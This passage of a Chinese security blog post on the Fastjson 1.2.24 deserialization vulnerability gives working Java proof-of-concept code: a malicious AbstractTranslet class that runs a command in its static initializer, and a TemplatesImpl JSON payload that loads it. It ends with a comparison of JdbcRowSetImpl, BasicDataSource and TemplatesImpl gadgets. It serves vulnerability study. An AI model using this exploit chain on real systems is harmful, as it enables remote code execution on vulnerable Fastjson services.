+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">\<span class="hljs-string">&quot;_tfactory\&quot;: &#123;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><font style="color:rgba(0, 0, 0, 0.85);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.85);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.85);"></font></p>
+<p><font style="color:rgba(0, 0, 0, 0.85);"></font></p>
+<p>写了半天还是一直没弹出来，原来是和 CC3 那有关，给_class 赋值的时候调 defineTransletClasses，该方法从字节码中加载恶意类时，需要加载的类继承抽象类 AbstractTranslet，并且实现抽象方法</p>
+<p><img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1761743698514-cea1893e-1e5a-472d-8227-fe9de4389376.png" srcset="/img/loading.gif" lazyload></p>
+<p>恶意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>  &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastJson_TemplatesImpl</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br><br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">fileSeparator</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;file.separator&quot;</span>);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\Security\\test_deserialize\\Calc.class&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>        String s=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;&quot;</span>+code+<span class="hljs-string">&quot;\&quot;],\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;_name\&quot;: \&quot;FastJson\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br><br><br><br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSONObject.parseObject(s,Feature.SupportNonPublicField);<br><br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            IOUtils.copy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(cls)), bos);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> Base64.encodeBase64String(bos.toByteArray());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>JdbcRowSetImpl 该 POC 结合 JNDI,需要 RMI 或 LDAP 服务，对于检测 FastJson 是否存在，是最简单的（结合 DNSLog）</li>
+<li>BasicDataSource 它漏洞利用是最方便的，不出网，不需要依赖 JNDI 服务</li>
+<li>TemplatesImpl 利用是有限制的，需要 parseObject(s,Feature.SupportNonPublicField)对没有 setter 方法的私有属性进行赋值</li>
+</ol>
+<h4 id><a href="#" class="headerlink" title=" "></a><font style="color:rgba(0, 0, 0, 0.85);"> </font></h4>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Fastjson/" class="print-no-link">#Fastjson</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Fastjson -1.2.24</div>
+      <div>https://bxhhf.github.io/2025/11/04/yuque-hexo-post/Fastjson -1.2.24/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>bxhhf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/11/05/yuque-hexo-post/FastJson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" title="FastJson各版本绕过分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">FastJson各版本绕过分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/23/yuque-hexo-post/Fastjson%E5%9F%BA%E7%A1%80/" title="Fastjson基础">
+                        <span class="hidden-mobile">Fastjson基础</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"AN6AZUYA9oJo0TesuVqbgX1I-gzGzoHsz","appKey":"gbgqDB024hr2I7jmwbO6Mz2a","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiaoxuehua.js"></script>
+<script src="/js/background.js"></script>
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/sign.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+  <!-- 雪花特效 -->
+  <script type="text/javascript" src="\js\snow.js"></script>
+  
+</body>
+</html>
